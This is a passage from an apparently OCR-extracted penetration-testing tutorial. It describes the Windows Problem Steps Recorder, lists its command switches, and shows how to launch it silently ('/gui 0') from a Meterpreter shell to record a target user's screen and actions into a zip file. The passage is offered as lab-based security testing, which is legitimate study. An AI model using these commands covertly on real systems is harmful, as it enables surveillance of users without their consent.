- img_proc: false
  md: '# Using "Step Recorder" as a Remote Security Tool


    Windows includes a great support program that you have probably never heard of
    called "Problem Steps Recorder" (PSR). Microsoft made this program to help troubleshooters
    see step-by-step what a user is doing. If a user is having a computer problem
    that they either can''t articulate well or tech support just can''t visualize
    the issue, all the support personnel needs to do is have the user run PSR.


    When PSR runs it automatically begins grabbing screen captures of everything that
    the user clicks on, it also keeps a running dialog of what the user is doing in
    a text log. When done, the data is saved into an HTML format and zipped so all
    the user needs to do is e-mail this to the tech support department. I have honestly
    never heard of PSR until a while back when a user on Twitter mentioned that the
    tool''s group policy wording was a bit concerning from a privacy standpoint. Creepy
    indeed, but I thought that if you could run it remotely, it would be a great tool
    for a penetration tester.


    Well, you can! Though running PSR as an attack tool isn''t a new idea. I did some
    searching and it is mentioned multiple times over the years in this manner. Pipefish
    even mentions using it with Metasploit back in 2012 ([https://pipefish.me/tag/psr-exe/](https://pipefish.me/tag/psr-exe/)).


    To use Steps Recorder normally, all you need to do is click the start button in
    Windows and type "psr" into the search box. Then click on "***Steps Recorder***"
    or just run "***psr.exe***". When you do, a small user interface opens up:


    ![](bbox=[0.151, 0.584, 0.583, 0.696])


    Just click "***Start Record***" to start. PSR then immediately begins grabbing
    screenshots. It displays a red globe around the pointer whenever a screenshot
    is taken. Then press "Stop Recording" when done. You will then be presented with
    a very impressive looking report of everything that you did. You then have the
    option of saving the report.


    PSR can be run from the command prompt, below is a listing from Microsoft of the
    command switches:'
  merge: -1
  pgno: 324
- img_proc: false
  md: '```

    psr.exe [/start [/stop] [/output <fullfilepath>]] [/sc (0|1)] [/maxsc <value>]

    [/sketch (0|1)] [/slides (0|1)] [/gui (0|1)]

    [/arcetl (0|1)] [/arcxml (0|1)] [/arcmht (0|1)]

    [/stopevent <eventname>] [/maxlogsize <value>] [/recordpid <pid>]


    /start         Start Recording. (Outputpath flag SHOULD be specified)

    /stop          Stop Recording.

    /sc            Capture screenshots for recorded steps.

    /maxsc         Maximum number of recent screen captures.

    /maxlogsize    Maximum log file size (in MB) before wrapping occurs.

    /gui           Display control GUI.

    /arcetl        Include raw ETW file in archive output.

    /arcxml        Include MHT file in archive output.

    /recordpid     Record all actions associated with given PID.

    /sketch        Sketch UI if no screenshot was saved.

    /slides        Create slide show HTML pages.

    /output        Store output of record session in given path.

    /stopevent     Event to signal after output files are generated.

    ```


    # Using PSR remotely with Metasploit


    Using the command line options, PSR works very nicely with Metasploit in a security
    testing environment. There are several ways that we could use PSR through Metasploit
    with automated scripts, but I will show you the manual way. We will start with
    an active remote Meterpreter session open between the Windows 7 VM and our Kali
    Linux system:


    +   1. Type, "**shell**" to drop to a command prompt.

    2. Enter, "**psr.exe /start /gui 0 /output C:\Users\Dan\Desktop\cool.zip**":


    ```

    meterpreter > shell

    Process 3720 created.

    Channel 2 created.

    Microsoft Windows [Version 6.1.7600]

    Copyright (c) 2009 Microsoft Corporation. All rights reserved.


    C:\Users\Dan>psr.exe /start /gui 0 /output C:\Users\Dan\Desktop\cool.zip

    ```


    +   3. Now on the Windows 7 system, open the internet browser and do some surfing.

    4. After a few seconds of surfing, enter "**psr.exe /stop**".


    The command in #2 above starts PSR, turns off the graphical window that pops up
    when running (***gui 0***), and turns off the red pointer glow when recording
    pages. It then saves the file to the user''s desktop as "cool.zip" as soon as
    the'
